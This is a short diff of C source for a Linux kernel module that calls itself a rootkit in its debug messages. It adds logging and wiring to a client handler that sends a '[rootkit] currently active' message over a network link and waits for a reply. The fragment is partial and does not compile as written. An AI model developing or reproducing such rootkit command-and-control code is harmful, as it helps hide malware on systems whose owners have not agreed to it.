@@ -1,8 +1,14 @@
 #include <linux/string.h>
-#include <custom/networking.c>
 
+#include <networking.c>
+
+extern struct client_t client;
 static int client_handler(void){
-	memset(client.message, 0, sizeof(client.message)); //zeroes out message buffer
+	printk(KERN_DEBUG "[rootkit] in client_handler");
+	if (client.message == NULL) { //if message is null
+		printk(KERN_DEBUG "[rootkit] client message is null!!!");
+	}
+	memset(client.message, 0, sizeof(client.message)); //zeroescout message buffer
 	strcpy(client.message, "[rootkit] currently active"); //copies basic auth message into buffer
 	net_send();
 	net_recv();
@@ -18,6 +24,8 @@ static int client_handler(void){
 	}
 	return 0; //return 0 for no errors
 }
+
+client.client_handler = client_handler;
 
 static int client_print(char *message){
 	/*
